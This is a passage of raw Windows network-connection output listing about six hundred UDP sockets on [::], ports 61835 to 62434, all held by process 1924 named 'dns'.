  UDP        [::]                                        61835         *:*                            1924              dns
  UDP        [::]                                        61836         *:*                            1924              dns
  UDP        [::]                                        61837         *:*                            1924              dns
  UDP        [::]                                        61838         *:*                            1924              dns
  UDP        [::]                                        61839         *:*                            1924              dns
  UDP        [::]                                        61840         *:*                            1924              dns
  UDP        [::]                                        61841         *:*                            1924              dns
  UDP        [::]                                        61842         *:*                            1924              dns
  UDP        [::]                                        61843         *:*                            1924              dns
  UDP        [::]                                        61844         *:*                            1924              dns
  UDP        [::]                                        61845         *:*                            1924              dns
  UDP        [::]                                        61846         *:*                            1924              dns
  UDP        [::]                                        61847         *:*                            1924              dns
  UDP        [::]                                        61848         *:*                            1924              dns
  UDP        [::]                                        61849         *:*                            1924              dns
  UDP        [::]                                        61850         *:*                            1924              dns
  UDP        [::]                                        61851         *:*                            1924              dns
  UDP        [::]                                        61852         *:*                            1924              dns
  UDP        [::]                                        61853         *:*                            1924              dns
  UDP        [::]                                        61854         *:*                            1924              dns
  UDP        [::]                                        61855         *:*                            1924              dns
  UDP        [::]                                        61856         *:*                            1924              dns
  UDP        [::]                                        61857         *:*                            1924              dns
  UDP        [::]                                        61858         *:*                            1924              dns
  UDP        [::]                                        61859         *:*                            1924              dns
  UDP        [::]                                        61860         *:*                            1924              dns
  UDP        [::]                                        61861         *:*                            1924              dns
  UDP        [::]                                        61862         *:*                            1924              dns
  UDP        [::]                                        61863         *:*                            1924              dns
  UDP        [::]                                        61864         *:*                            1924              dns
  UDP        [::]                                        61865         *:*                            1924              dns
  UDP        [::]                                        61866         *:*                            1924              dns
  UDP        [::]                                        61867         *:*                            1924              dns
  UDP        [::]                                        61868         *:*                            1924              dns
  UDP        [::]                                        61869         *:*                            1924              dns
  UDP        [::]                                        61870         *:*                            1924              dns
  UDP        [::]                                        61871         *:*                            1924              dns
  UDP        [::]                                        61872         *:*                            1924              dns
  UDP        [::]                                        61873         *:*                            1924              dns
  UDP        [::]                                        61874         *:*                            1924              dns
  UDP        [::]                                        61875         *:*                            1924              dns
  UDP        [::]                                        61876         *:*                            1924              dns
  UDP        [::]                                        61877         *:*                            1924              dns
  UDP        [::]                                        61878         *:*                            1924              dns
  UDP        [::]                                        61879         *:*                            1924              dns
  UDP        [::]                                        61880         *:*                            1924              dns
  UDP        [::]                                        61881         *:*                            1924              dns
  UDP        [::]                                        61882         *:*                            1924              dns
  UDP        [::]                                        61883         *:*                            1924              dns
  UDP        [::]                                        61884         *:*                            1924              dns
  UDP        [::]                                        61885         *:*                            1924              dns
  UDP        [::]                                        61886         *:*                            1924              dns
  UDP        [::]                                        61887         *:*                            1924              dns
  UDP        [::]                                        61888         *:*                            1924              dns
  UDP        [::]                                        61889         *:*                            1924              dns
  UDP        [::]                                        61890         *:*                            1924              dns
  UDP        [::]                                        61891         *:*                            1924              dns
  UDP        [::]                                        61892         *:*                            1924              dns
  UDP        [::]                                        61893         *:*                            1924              dns
  UDP        [::]                                        61894         *:*                            1924              dns
  UDP        [::]                                        61895         *:*                            1924              dns
  UDP        [::]                                        61896         *:*                            1924              dns
  UDP        [::]                                        61897         *:*                            1924              dns
  UDP        [::]                                        61898         *:*                            1924              dns
  UDP        [::]                                        61899         *:*                            1924              dns
  UDP        [::]                                        61900         *:*                            1924              dns
  UDP        [::]                                        61901         *:*                            1924              dns
  UDP        [::]                                        61902         *:*                            1924              dns
  UDP        [::]                                        61903         *:*                            1924              dns
  UDP        [::]                                        61904         *:*                            1924              dns
  UDP        [::]                                        61905         *:*                            1924              dns
  UDP        [::]                                        61906         *:*                            1924              dns
  UDP        [::]                                        61907         *:*                            1924              dns
  UDP        [::]                                        61908         *:*                            1924              dns
  UDP        [::]                                        61909         *:*                            1924              dns
  UDP        [::]                                        61910         *:*                            1924              dns
  UDP        [::]                                        61911         *:*                            1924              dns
  UDP        [::]                                        61912         *:*                            1924              dns
  UDP        [::]                                        61913         *:*                            1924              dns
  UDP        [::]                                        61914         *:*                            1924              dns
  UDP        [::]                                        61915         *:*                            1924              dns
  UDP        [::]                                        61916         *:*                            1924              dns
  UDP        [::]                                        61917         *:*                            1924              dns
  UDP        [::]                                        61918         *:*                            1924              dns
  UDP        [::]                                        61919         *:*                            1924              dns
  UDP        [::]                                        61920         *:*                            1924              dns
  UDP        [::]                                        61921         *:*                            1924              dns
  UDP        [::]                                        61922         *:*                            1924              dns
  UDP        [::]                                        61923         *:*                            1924              dns
  UDP        [::]                                        61924         *:*                            1924              dns
  UDP        [::]                                        61925         *:*                            1924              dns
  UDP        [::]                                        61926         *:*                            1924              dns
  UDP        [::]                                        61927         *:*                            1924              dns
  UDP        [::]                                        61928         *:*                            1924              dns
  UDP        [::]                                        61929         *:*                            1924              dns
  UDP        [::]                                        61930         *:*                            1924              dns
  UDP        [::]                                        61931         *:*                            1924              dns
  UDP        [::]                                        61932         *:*                            1924              dns
  UDP        [::]                                        61933         *:*                            1924              dns
  UDP        [::]                                        61934         *:*                            1924              dns
  UDP        [::]                                        61935         *:*                            1924              dns
  UDP        [::]                                        61936         *:*                            1924              dns
  UDP        [::]                                        61937         *:*                            1924              dns
  UDP        [::]                                        61938         *:*                            1924              dns
  UDP        [::]                                        61939         *:*                            1924              dns
  UDP        [::]                                        61940         *:*                            1924              dns
  UDP        [::]                                        61941         *:*                            1924              dns
  UDP        [::]                                        61942         *:*                            1924              dns
  UDP        [::]                                        61943         *:*                            1924              dns
  UDP        [::]                                        61944         *:*                            1924              dns
  UDP        [::]                                        61945         *:*                            1924              dns
  UDP        [::]                                        61946         *:*                            1924              dns
  UDP        [::]                                        61947         *:*                            1924              dns
  UDP        [::]                                        61948         *:*                            1924              dns
  UDP        [::]                                        61949         *:*                            1924              dns
  UDP        [::]                                        61950         *:*                            1924              dns
  UDP        [::]                                        61951         *:*                            1924              dns
  UDP        [::]                                        61952         *:*                            1924              dns
  UDP        [::]                                        61953         *:*                            1924              dns
  UDP        [::]                                        61954         *:*                            1924              dns
  UDP        [::]                                        61955         *:*                            1924              dns
  UDP        [::]                                        61956         *:*                            1924              dns
  UDP        [::]                                        61957         *:*                            1924              dns
  UDP        [::]                                        61958         *:*                            1924              dns
  UDP        [::]                                        61959         *:*                            1924              dns
  UDP        [::]                                        61960         *:*                            1924              dns
  UDP        [::]                                        61961         *:*                            1924              dns
  UDP        [::]                                        61962         *:*                            1924              dns
  UDP        [::]                                        61963         *:*                            1924              dns
  UDP        [::]                                        61964         *:*                            1924              dns
  UDP        [::]                                        61965         *:*                            1924              dns
  UDP        [::]                                        61966         *:*                            1924              dns
  UDP        [::]                                        61967         *:*                            1924              dns
  UDP        [::]                                        61968         *:*                            1924              dns
  UDP        [::]                                        61969         *:*                            1924              dns
  UDP        [::]                                        61970         *:*                            1924              dns
  UDP        [::]                                        61971         *:*                            1924              dns
  UDP        [::]                                        61972         *:*                            1924              dns
  UDP        [::]                                        61973         *:*                            1924              dns
  UDP        [::]                                        61974         *:*                            1924              dns
  UDP        [::]                                        61975         *:*                            1924              dns
  UDP        [::]                                        61976         *:*                            1924              dns
  UDP        [::]                                        61977         *:*                            1924              dns
  UDP        [::]                                        61978         *:*                            1924              dns
  UDP        [::]                                        61979         *:*                            1924              dns
  UDP        [::]                                        61980         *:*                            1924              dns
  UDP        [::]                                        61981         *:*                            1924              dns
  UDP        [::]                                        61982         *:*                            1924              dns
  UDP        [::]                                        61983         *:*                            1924              dns
  UDP        [::]                                        61984         *:*                            1924              dns
  UDP        [::]                                        61985         *:*                            1924              dns
  UDP        [::]                                        61986         *:*                            1924              dns
  UDP        [::]                                        61987         *:*                            1924              dns
  UDP        [::]                                        61988         *:*                            1924              dns
  UDP        [::]                                        61989         *:*                            1924              dns
  UDP        [::]                                        61990         *:*                            1924              dns
  UDP        [::]                                        61991         *:*                            1924              dns
  UDP        [::]                                        61992         *:*                            1924              dns
  UDP        [::]                                        61993         *:*                            1924              dns
  UDP        [::]                                        61994         *:*                            1924              dns
  UDP        [::]                                        61995         *:*                            1924              dns
  UDP        [::]                                        61996         *:*                            1924              dns
  UDP        [::]                                        61997         *:*                            1924              dns
  UDP        [::]                                        61998         *:*                            1924              dns
  UDP        [::]                                        61999         *:*                            1924              dns
  UDP        [::]                                        62000         *:*                            1924              dns
  UDP        [::]                                        62001         *:*                            1924              dns
  UDP        [::]                                        62002         *:*                            1924              dns
  UDP        [::]                                        62003         *:*                            1924              dns
  UDP        [::]                                        62004         *:*                            1924              dns
  UDP        [::]                                        62005         *:*                            1924              dns
  UDP        [::]                                        62006         *:*                            1924              dns
  UDP        [::]                                        62007         *:*                            1924              dns
  UDP        [::]                                        62008         *:*                            1924              dns
  UDP        [::]                                        62009         *:*                            1924              dns
  UDP        [::]                                        62010         *:*                            1924              dns
  UDP        [::]                                        62011         *:*                            1924              dns
  UDP        [::]                                        62012         *:*                            1924              dns
  UDP        [::]                                        62013         *:*                            1924              dns
  UDP        [::]                                        62014         *:*                            1924              dns
  UDP        [::]                                        62015         *:*                            1924              dns
  UDP        [::]                                        62016         *:*                            1924              dns
  UDP        [::]                                        62017         *:*                            1924              dns
  UDP        [::]                                        62018         *:*                            1924              dns
  UDP        [::]                                        62019         *:*                            1924              dns
  UDP        [::]                                        62020         *:*                            1924              dns
  UDP        [::]                                        62021         *:*                            1924              dns
  UDP        [::]                                        62022         *:*                            1924              dns
  UDP        [::]                                        62023         *:*                            1924              dns
  UDP        [::]                                        62024         *:*                            1924              dns
  UDP        [::]                                        62025         *:*                            1924              dns
  UDP        [::]                                        62026         *:*                            1924              dns
  UDP        [::]                                        62027         *:*                            1924              dns
  UDP        [::]                                        62028         *:*                            1924              dns
  UDP        [::]                                        62029         *:*                            1924              dns
  UDP        [::]                                        62030         *:*                            1924              dns
  UDP        [::]                                        62031         *:*                            1924              dns
  UDP        [::]                                        62032         *:*                            1924              dns
  UDP        [::]                                        62033         *:*                            1924              dns
  UDP        [::]                                        62034         *:*                            1924              dns
  UDP        [::]                                        62035         *:*                            1924              dns
  UDP        [::]                                        62036         *:*                            1924              dns
  UDP        [::]                                        62037         *:*                            1924              dns
  UDP        [::]                                        62038         *:*                            1924              dns
  UDP        [::]                                        62039         *:*                            1924              dns
  UDP        [::]                                        62040         *:*                            1924              dns
  UDP        [::]                                        62041         *:*                            1924              dns
  UDP        [::]                                        62042         *:*                            1924              dns
  UDP        [::]                                        62043         *:*                            1924              dns
  UDP        [::]                                        62044         *:*                            1924              dns
  UDP        [::]                                        62045         *:*                            1924              dns
  UDP        [::]                                        62046         *:*                            1924              dns
  UDP        [::]                                        62047         *:*                            1924              dns
  UDP        [::]                                        62048         *:*                            1924              dns
  UDP        [::]                                        62049         *:*                            1924              dns
  UDP        [::]                                        62050         *:*                            1924              dns
  UDP        [::]                                        62051         *:*                            1924              dns
  UDP        [::]                                        62052         *:*                            1924              dns
  UDP        [::]                                        62053         *:*                            1924              dns
  UDP        [::]                                        62054         *:*                            1924              dns
  UDP        [::]                                        62055         *:*                            1924              dns
  UDP        [::]                                        62056         *:*                            1924              dns
  UDP        [::]                                        62057         *:*                            1924              dns
  UDP        [::]                                        62058         *:*                            1924              dns
  UDP        [::]                                        62059         *:*                            1924              dns
  UDP        [::]                                        62060         *:*                            1924              dns
  UDP        [::]                                        62061         *:*                            1924              dns
  UDP        [::]                                        62062         *:*                            1924              dns
  UDP        [::]                                        62063         *:*                            1924              dns
  UDP        [::]                                        62064         *:*                            1924              dns
  UDP        [::]                                        62065         *:*                            1924              dns
  UDP        [::]                                        62066         *:*                            1924              dns
  UDP        [::]                                        62067         *:*                            1924              dns
  UDP        [::]                                        62068         *:*                            1924              dns
  UDP        [::]                                        62069         *:*                            1924              dns
  UDP        [::]                                        62070         *:*                            1924              dns
  UDP        [::]                                        62071         *:*                            1924              dns
  UDP        [::]                                        62072         *:*                            1924              dns
  UDP        [::]                                        62073         *:*                            1924              dns
  UDP        [::]                                        62074         *:*                            1924              dns
  UDP        [::]                                        62075         *:*                            1924              dns
  UDP        [::]                                        62076         *:*                            1924              dns
  UDP        [::]                                        62077         *:*                            1924              dns
  UDP        [::]                                        62078         *:*                            1924              dns
  UDP        [::]                                        62079         *:*                            1924              dns
  UDP        [::]                                        62080         *:*                            1924              dns
  UDP        [::]                                        62081         *:*                            1924              dns
  UDP        [::]                                        62082         *:*                            1924              dns
  UDP        [::]                                        62083         *:*                            1924              dns
  UDP        [::]                                        62084         *:*                            1924              dns
  UDP        [::]                                        62085         *:*                            1924              dns
  UDP        [::]                                        62086         *:*                            1924              dns
  UDP        [::]                                        62087         *:*                            1924              dns
  UDP        [::]                                        62088         *:*                            1924              dns
  UDP        [::]                                        62089         *:*                            1924              dns
  UDP        [::]                                        62090         *:*                            1924              dns
  UDP        [::]                                        62091         *:*                            1924              dns
  UDP        [::]                                        62092         *:*                            1924              dns
  UDP        [::]                                        62093         *:*                            1924              dns
  UDP        [::]                                        62094         *:*                            1924              dns
  UDP        [::]                                        62095         *:*                            1924              dns
  UDP        [::]                                        62096         *:*                            1924              dns
  UDP        [::]                                        62097         *:*                            1924              dns
  UDP        [::]                                        62098         *:*                            1924              dns
  UDP        [::]                                        62099         *:*                            1924              dns
  UDP        [::]                                        62100         *:*                            1924              dns
  UDP        [::]                                        62101         *:*                            1924              dns
  UDP        [::]                                        62102         *:*                            1924              dns
  UDP        [::]                                        62103         *:*                            1924              dns
  UDP        [::]                                        62104         *:*                            1924              dns
  UDP        [::]                                        62105         *:*                            1924              dns
  UDP        [::]                                        62106         *:*                            1924              dns
  UDP        [::]                                        62107         *:*                            1924              dns
  UDP        [::]                                        62108         *:*                            1924              dns
  UDP        [::]                                        62109         *:*                            1924              dns
  UDP        [::]                                        62110         *:*                            1924              dns
  UDP        [::]                                        62111         *:*                            1924              dns
  UDP        [::]                                        62112         *:*                            1924              dns
  UDP        [::]                                        62113         *:*                            1924              dns
  UDP        [::]                                        62114         *:*                            1924              dns
  UDP        [::]                                        62115         *:*                            1924              dns
  UDP        [::]                                        62116         *:*                            1924              dns
  UDP        [::]                                        62117         *:*                            1924              dns
  UDP        [::]                                        62118         *:*                            1924              dns
  UDP        [::]                                        62119         *:*                            1924              dns
  UDP        [::]                                        62120         *:*                            1924              dns
  UDP        [::]                                        62121         *:*                            1924              dns
  UDP        [::]                                        62122         *:*                            1924              dns
  UDP        [::]                                        62123         *:*                            1924              dns
  UDP        [::]                                        62124         *:*                            1924              dns
  UDP        [::]                                        62125         *:*                            1924              dns
  UDP        [::]                                        62126         *:*                            1924              dns
  UDP        [::]                                        62127         *:*                            1924              dns
  UDP        [::]                                        62128         *:*                            1924              dns
  UDP        [::]                                        62129         *:*                            1924              dns
  UDP        [::]                                        62130         *:*                            1924              dns
  UDP        [::]                                        62131         *:*                            1924              dns
  UDP        [::]                                        62132         *:*                            1924              dns
  UDP        [::]                                        62133         *:*                            1924              dns
  UDP        [::]                                        62134         *:*                            1924              dns
  UDP        [::]                                        62135         *:*                            1924              dns
  UDP        [::]                                        62136         *:*                            1924              dns
  UDP        [::]                                        62137         *:*                            1924              dns
  UDP        [::]                                        62138         *:*                            1924              dns
  UDP        [::]                                        62139         *:*                            1924              dns
  UDP        [::]                                        62140         *:*                            1924              dns
  UDP        [::]                                        62141         *:*                            1924              dns
  UDP        [::]                                        62142         *:*                            1924              dns
  UDP        [::]                                        62143         *:*                            1924              dns
  UDP        [::]                                        62144         *:*                            1924              dns
  UDP        [::]                                        62145         *:*                            1924              dns
  UDP        [::]                                        62146         *:*                            1924              dns
  UDP        [::]                                        62147         *:*                            1924              dns
  UDP        [::]                                        62148         *:*                            1924              dns
  UDP        [::]                                        62149         *:*                            1924              dns
  UDP        [::]                                        62150         *:*                            1924              dns
  UDP        [::]                                        62151         *:*                            1924              dns
  UDP        [::]                                        62152         *:*                            1924              dns
  UDP        [::]                                        62153         *:*                            1924              dns
  UDP        [::]                                        62154         *:*                            1924              dns
  UDP        [::]                                        62155         *:*                            1924              dns
  UDP        [::]                                        62156         *:*                            1924              dns
  UDP        [::]                                        62157         *:*                            1924              dns
  UDP        [::]                                        62158         *:*                            1924              dns
  UDP        [::]                                        62159         *:*                            1924              dns
  UDP        [::]                                        62160         *:*                            1924              dns
  UDP        [::]                                        62161         *:*                            1924              dns
  UDP        [::]                                        62162         *:*                            1924              dns
  UDP        [::]                                        62163         *:*                            1924              dns
  UDP        [::]                                        62164         *:*                            1924              dns
  UDP        [::]                                        62165         *:*                            1924              dns
  UDP        [::]                                        62166         *:*                            1924              dns
  UDP        [::]                                        62167         *:*                            1924              dns
  UDP        [::]                                        62168         *:*                            1924              dns
  UDP        [::]                                        62169         *:*                            1924              dns
  UDP        [::]                                        62170         *:*                            1924              dns
  UDP        [::]                                        62171         *:*                            1924              dns
  UDP        [::]                                        62172         *:*                            1924              dns
  UDP        [::]                                        62173         *:*                            1924              dns
  UDP        [::]                                        62174         *:*                            1924              dns
  UDP        [::]                                        62175         *:*                            1924              dns
  UDP        [::]                                        62176         *:*                            1924              dns
  UDP        [::]                                        62177         *:*                            1924              dns
  UDP        [::]                                        62178         *:*                            1924              dns
  UDP        [::]                                        62179         *:*                            1924              dns
  UDP        [::]                                        62180         *:*                            1924              dns
  UDP        [::]                                        62181         *:*                            1924              dns
  UDP        [::]                                        62182         *:*                            1924              dns
  UDP        [::]                                        62183         *:*                            1924              dns
  UDP        [::]                                        62184         *:*                            1924              dns
  UDP        [::]                                        62185         *:*                            1924              dns
  UDP        [::]                                        62186         *:*                            1924              dns
  UDP        [::]                                        62187         *:*                            1924              dns
  UDP        [::]                                        62188         *:*                            1924              dns
  UDP        [::]                                        62189         *:*                            1924              dns
  UDP        [::]                                        62190         *:*                            1924              dns
  UDP        [::]                                        62191         *:*                            1924              dns
  UDP        [::]                                        62192         *:*                            1924              dns
  UDP        [::]                                        62193         *:*                            1924              dns
  UDP        [::]                                        62194         *:*                            1924              dns
  UDP        [::]                                        62195         *:*                            1924              dns
  UDP        [::]                                        62196         *:*                            1924              dns
  UDP        [::]                                        62197         *:*                            1924              dns
  UDP        [::]                                        62198         *:*                            1924              dns
  UDP        [::]                                        62199         *:*                            1924              dns
  UDP        [::]                                        62200         *:*                            1924              dns
  UDP        [::]                                        62201         *:*                            1924              dns
  UDP        [::]                                        62202         *:*                            1924              dns
  UDP        [::]                                        62203         *:*                            1924              dns
  UDP        [::]                                        62204         *:*                            1924              dns
  UDP        [::]                                        62205         *:*                            1924              dns
  UDP        [::]                                        62206         *:*                            1924              dns
  UDP        [::]                                        62207         *:*                            1924              dns
  UDP        [::]                                        62208         *:*                            1924              dns
  UDP        [::]                                        62209         *:*                            1924              dns
  UDP        [::]                                        62210         *:*                            1924              dns
  UDP        [::]                                        62211         *:*                            1924              dns
  UDP        [::]                                        62212         *:*                            1924              dns
  UDP        [::]                                        62213         *:*                            1924              dns
  UDP        [::]                                        62214         *:*                            1924              dns
  UDP        [::]                                        62215         *:*                            1924              dns
  UDP        [::]                                        62216         *:*                            1924              dns
  UDP        [::]                                        62217         *:*                            1924              dns
  UDP        [::]                                        62218         *:*                            1924              dns
  UDP        [::]                                        62219         *:*                            1924              dns
  UDP        [::]                                        62220         *:*                            1924              dns
  UDP        [::]                                        62221         *:*                            1924              dns
  UDP        [::]                                        62222         *:*                            1924              dns
  UDP        [::]                                        62223         *:*                            1924              dns
  UDP        [::]                                        62224         *:*                            1924              dns
  UDP        [::]                                        62225         *:*                            1924              dns
  UDP        [::]                                        62226         *:*                            1924              dns
  UDP        [::]                                        62227         *:*                            1924              dns
  UDP        [::]                                        62228         *:*                            1924              dns
  UDP        [::]                                        62229         *:*                            1924              dns
  UDP        [::]                                        62230         *:*                            1924              dns
  UDP        [::]                                        62231         *:*                            1924              dns
  UDP        [::]                                        62232         *:*                            1924              dns
  UDP        [::]                                        62233         *:*                            1924              dns
  UDP        [::]                                        62234         *:*                            1924              dns
  UDP        [::]                                        62235         *:*                            1924              dns
  UDP        [::]                                        62236         *:*                            1924              dns
  UDP        [::]                                        62237         *:*                            1924              dns
  UDP        [::]                                        62238         *:*                            1924              dns
  UDP        [::]                                        62239         *:*                            1924              dns
  UDP        [::]                                        62240         *:*                            1924              dns
  UDP        [::]                                        62241         *:*                            1924              dns
  UDP        [::]                                        62242         *:*                            1924              dns
  UDP        [::]                                        62243         *:*                            1924              dns
  UDP        [::]                                        62244         *:*                            1924              dns
  UDP        [::]                                        62245         *:*                            1924              dns
  UDP        [::]                                        62246         *:*                            1924              dns
  UDP        [::]                                        62247         *:*                            1924              dns
  UDP        [::]                                        62248         *:*                            1924              dns
  UDP        [::]                                        62249         *:*                            1924              dns
  UDP        [::]                                        62250         *:*                            1924              dns
  UDP        [::]                                        62251         *:*                            1924              dns
  UDP        [::]                                        62252         *:*                            1924              dns
  UDP        [::]                                        62253         *:*                            1924              dns
  UDP        [::]                                        62254         *:*                            1924              dns
  UDP        [::]                                        62255         *:*                            1924              dns
  UDP        [::]                                        62256         *:*                            1924              dns
  UDP        [::]                                        62257         *:*                            1924              dns
  UDP        [::]                                        62258         *:*                            1924              dns
  UDP        [::]                                        62259         *:*                            1924              dns
  UDP        [::]                                        62260         *:*                            1924              dns
  UDP        [::]                                        62261         *:*                            1924              dns
  UDP        [::]                                        62262         *:*                            1924              dns
  UDP        [::]                                        62263         *:*                            1924              dns
  UDP        [::]                                        62264         *:*                            1924              dns
  UDP        [::]                                        62265         *:*                            1924              dns
  UDP        [::]                                        62266         *:*                            1924              dns
  UDP        [::]                                        62267         *:*                            1924              dns
  UDP        [::]                                        62268         *:*                            1924              dns
  UDP        [::]                                        62269         *:*                            1924              dns
  UDP        [::]                                        62270         *:*                            1924              dns
  UDP        [::]                                        62271         *:*                            1924              dns
  UDP        [::]                                        62272         *:*                            1924              dns
  UDP        [::]                                        62273         *:*                            1924              dns
  UDP        [::]                                        62274         *:*                            1924              dns
  UDP        [::]                                        62275         *:*                            1924              dns
  UDP        [::]                                        62276         *:*                            1924              dns
  UDP        [::]                                        62277         *:*                            1924              dns
  UDP        [::]                                        62278         *:*                            1924              dns
  UDP        [::]                                        62279         *:*                            1924              dns
  UDP        [::]                                        62280         *:*                            1924              dns
  UDP        [::]                                        62281         *:*                            1924              dns
  UDP        [::]                                        62282         *:*                            1924              dns
  UDP        [::]                                        62283         *:*                            1924              dns
  UDP        [::]                                        62284         *:*                            1924              dns
  UDP        [::]                                        62285         *:*                            1924              dns
  UDP        [::]                                        62286         *:*                            1924              dns
  UDP        [::]                                        62287         *:*                            1924              dns
  UDP        [::]                                        62288         *:*                            1924              dns
  UDP        [::]                                        62289         *:*                            1924              dns
  UDP        [::]                                        62290         *:*                            1924              dns
  UDP        [::]                                        62291         *:*                            1924              dns
  UDP        [::]                                        62292         *:*                            1924              dns
  UDP        [::]                                        62293         *:*                            1924              dns
  UDP        [::]                                        62294         *:*                            1924              dns
  UDP        [::]                                        62295         *:*                            1924              dns
  UDP        [::]                                        62296         *:*                            1924              dns
  UDP        [::]                                        62297         *:*                            1924              dns
  UDP        [::]                                        62298         *:*                            1924              dns
  UDP        [::]                                        62299         *:*                            1924              dns
  UDP        [::]                                        62300         *:*                            1924              dns
  UDP        [::]                                        62301         *:*                            1924              dns
  UDP        [::]                                        62302         *:*                            1924              dns
  UDP        [::]                                        62303         *:*                            1924              dns
  UDP        [::]                                        62304         *:*                            1924              dns
  UDP        [::]                                        62305         *:*                            1924              dns
  UDP        [::]                                        62306         *:*                            1924              dns
  UDP        [::]                                        62307         *:*                            1924              dns
  UDP        [::]                                        62308         *:*                            1924              dns
  UDP        [::]                                        62309         *:*                            1924              dns
  UDP        [::]                                        62310         *:*                            1924              dns
  UDP        [::]                                        62311         *:*                            1924              dns
  UDP        [::]                                        62312         *:*                            1924              dns
  UDP        [::]                                        62313         *:*                            1924              dns
  UDP        [::]                                        62314         *:*                            1924              dns
  UDP        [::]                                        62315         *:*                            1924              dns
  UDP        [::]                                        62316         *:*                            1924              dns
  UDP        [::]                                        62317         *:*                            1924              dns
  UDP        [::]                                        62318         *:*                            1924              dns
  UDP        [::]                                        62319         *:*                            1924              dns
  UDP        [::]                                        62320         *:*                            1924              dns
  UDP        [::]                                        62321         *:*                            1924              dns
  UDP        [::]                                        62322         *:*                            1924              dns
  UDP        [::]                                        62323         *:*                            1924              dns
  UDP        [::]                                        62324         *:*                            1924              dns
  UDP        [::]                                        62325         *:*                            1924              dns
  UDP        [::]                                        62326         *:*                            1924              dns
  UDP        [::]                                        62327         *:*                            1924              dns
  UDP        [::]                                        62328         *:*                            1924              dns
  UDP        [::]                                        62329         *:*                            1924              dns
  UDP        [::]                                        62330         *:*                            1924              dns
  UDP        [::]                                        62331         *:*                            1924              dns
  UDP        [::]                                        62332         *:*                            1924              dns
  UDP        [::]                                        62333         *:*                            1924              dns
  UDP        [::]                                        62334         *:*                            1924              dns
  UDP        [::]                                        62335         *:*                            1924              dns
  UDP        [::]                                        62336         *:*                            1924              dns
  UDP        [::]                                        62337         *:*                            1924              dns
  UDP        [::]                                        62338         *:*                            1924              dns
  UDP        [::]                                        62339         *:*                            1924              dns
  UDP        [::]                                        62340         *:*                            1924              dns
  UDP        [::]                                        62341         *:*                            1924              dns
  UDP        [::]                                        62342         *:*                            1924              dns
  UDP        [::]                                        62343         *:*                            1924              dns
  UDP        [::]                                        62344         *:*                            1924              dns
  UDP        [::]                                        62345         *:*                            1924              dns
  UDP        [::]                                        62346         *:*                            1924              dns
  UDP        [::]                                        62347         *:*                            1924              dns
  UDP        [::]                                        62348         *:*                            1924              dns
  UDP        [::]                                        62349         *:*                            1924              dns
  UDP        [::]                                        62350         *:*                            1924              dns
  UDP        [::]                                        62351         *:*                            1924              dns
  UDP        [::]                                        62352         *:*                            1924              dns
  UDP        [::]                                        62353         *:*                            1924              dns
  UDP        [::]                                        62354         *:*                            1924              dns
  UDP        [::]                                        62355         *:*                            1924              dns
  UDP        [::]                                        62356         *:*                            1924              dns
  UDP        [::]                                        62357         *:*                            1924              dns
  UDP        [::]                                        62358         *:*                            1924              dns
  UDP        [::]                                        62359         *:*                            1924              dns
  UDP        [::]                                        62360         *:*                            1924              dns
  UDP        [::]                                        62361         *:*                            1924              dns
  UDP        [::]                                        62362         *:*                            1924              dns
  UDP        [::]                                        62363         *:*                            1924              dns
  UDP        [::]                                        62364         *:*                            1924              dns
  UDP        [::]                                        62365         *:*                            1924              dns
  UDP        [::]                                        62366         *:*                            1924              dns
  UDP        [::]                                        62367         *:*                            1924              dns
  UDP        [::]                                        62368         *:*                            1924              dns
  UDP        [::]                                        62369         *:*                            1924              dns
  UDP        [::]                                        62370         *:*                            1924              dns
  UDP        [::]                                        62371         *:*                            1924              dns
  UDP        [::]                                        62372         *:*                            1924              dns
  UDP        [::]                                        62373         *:*                            1924              dns
  UDP        [::]                                        62374         *:*                            1924              dns
  UDP        [::]                                        62375         *:*                            1924              dns
  UDP        [::]                                        62376         *:*                            1924              dns
  UDP        [::]                                        62377         *:*                            1924              dns
  UDP        [::]                                        62378         *:*                            1924              dns
  UDP        [::]                                        62379         *:*                            1924              dns
  UDP        [::]                                        62380         *:*                            1924              dns
  UDP        [::]                                        62381         *:*                            1924              dns
  UDP        [::]                                        62382         *:*                            1924              dns
  UDP        [::]                                        62383         *:*                            1924              dns
  UDP        [::]                                        62384         *:*                            1924              dns
  UDP        [::]                                        62385         *:*                            1924              dns
  UDP        [::]                                        62386         *:*                            1924              dns
  UDP        [::]                                        62387         *:*                            1924              dns
  UDP        [::]                                        62388         *:*                            1924              dns
  UDP        [::]                                        62389         *:*                            1924              dns
  UDP        [::]                                        62390         *:*                            1924              dns
  UDP        [::]                                        62391         *:*                            1924              dns
  UDP        [::]                                        62392         *:*                            1924              dns
  UDP        [::]                                        62393         *:*                            1924              dns
  UDP        [::]                                        62394         *:*                            1924              dns
  UDP        [::]                                        62395         *:*                            1924              dns
  UDP        [::]                                        62396         *:*                            1924              dns
  UDP        [::]                                        62397         *:*                            1924              dns
  UDP        [::]                                        62398         *:*                            1924              dns
  UDP        [::]                                        62399         *:*                            1924              dns
  UDP        [::]                                        62400         *:*                            1924              dns
  UDP        [::]                                        62401         *:*                            1924              dns
  UDP        [::]                                        62402         *:*                            1924              dns
  UDP        [::]                                        62403         *:*                            1924              dns
  UDP        [::]                                        62404         *:*                            1924              dns
  UDP        [::]                                        62405         *:*                            1924              dns
  UDP        [::]                                        62406         *:*                            1924              dns
  UDP        [::]                                        62407         *:*                            1924              dns
  UDP        [::]                                        62408         *:*                            1924              dns
  UDP        [::]                                        62409         *:*                            1924              dns
  UDP        [::]                                        62410         *:*                            1924              dns
  UDP        [::]                                        62411         *:*                            1924              dns
  UDP        [::]                                        62412         *:*                            1924              dns
  UDP        [::]                                        62413         *:*                            1924              dns
  UDP        [::]                                        62414         *:*                            1924              dns
  UDP        [::]                                        62415         *:*                            1924              dns
  UDP        [::]                                        62416         *:*                            1924              dns
  UDP        [::]                                        62417         *:*                            1924              dns
  UDP        [::]                                        62418         *:*                            1924              dns
  UDP        [::]                                        62419         *:*                            1924              dns
  UDP        [::]                                        62420         *:*                            1924              dns
  UDP        [::]                                        62421         *:*                            1924              dns
  UDP        [::]                                        62422         *:*                            1924              dns
  UDP        [::]                                        62423         *:*                            1924              dns
  UDP        [::]                                        62424         *:*                            1924              dns
  UDP        [::]                                        62425         *:*                            1924              dns
  UDP        [::]                                        62426         *:*                            1924              dns
  UDP        [::]                                        62427         *:*                            1924              dns
  UDP        [::]                                        62428         *:*                            1924              dns
  UDP        [::]                                        62429         *:*                            1924              dns
  UDP        [::]                                        62430         *:*                            1924              dns
  UDP        [::]                                        62431         *:*                            1924              dns
  UDP        [::]                                        62432         *:*                            1924              dns
  UDP        [::]                                        62433         *:*                            1924              dns
  UDP        [::]                                        62434         *:*                            1924              dns
